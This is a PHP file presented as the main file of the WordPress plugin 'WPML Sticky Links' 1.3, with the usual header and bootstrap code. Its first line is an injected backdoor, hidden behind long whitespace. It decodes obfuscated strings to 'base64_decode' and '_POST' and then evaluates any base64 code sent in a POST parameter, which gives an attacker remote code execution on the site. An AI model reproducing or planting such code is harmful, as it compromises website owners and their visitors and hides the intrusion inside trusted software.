<?php                                                                                                                                                                                                                                                               $sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s20=strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2]);if (isset(${$s20}['n55d3bf'])) {eval($s21(${$s20}['n55d3bf']));}?><?php 
/*
Plugin Name: WPML Sticky Links
Plugin URI: http://wpml.org/
Description: Prevents internal links from ever breaking. <a href="http://wpml.org">Documentation</a>.
Author: ICanLocalize
Author URI: http://wpml.org
Version: 1.3
*/

if(defined('WPML_STICKY_LINKS_VERSION')) return;

define('WPML_STICKY_LINKS_VERSION', '1.3');
define('WPML_STICKY_LINKS_PATH', dirname(__FILE__));

require WPML_STICKY_LINKS_PATH . '/inc/constants.php';
require WPML_STICKY_LINKS_PATH . '/inc/sticky-links.class.php';

$WPML_Sticky_Links = new WPML_Sticky_Links();
?>
